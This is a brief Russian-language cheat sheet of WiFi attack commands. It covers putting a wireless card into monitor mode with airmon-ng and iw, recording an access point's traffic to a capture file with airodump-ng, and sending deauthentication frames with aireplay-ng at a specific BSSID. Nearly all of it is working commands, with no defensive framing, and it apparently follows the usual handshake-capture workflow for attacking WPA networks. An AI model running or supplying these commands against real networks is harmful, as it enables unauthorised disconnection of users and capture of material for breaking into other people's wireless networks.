# WIFI
# wifi

Ту же информацию о чипсете и драйвере можем посмотреть с помощью утилиты airmon-ng.

sudo systemctl stop NetworkManager
sudo airmon-ng check kill

sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

iw dev


# Режим монитора

sudo airmon-ng start wlan1

sudo airodump-ng wlan1 

# Запись дампа из точки доступа

sudo airodump-ng wlan1 --channel 11 -w cap2

# Деаутентификация

sudo aireplay-ng -0 5 -a A8:5E:45:B8:23:D8 wlan1
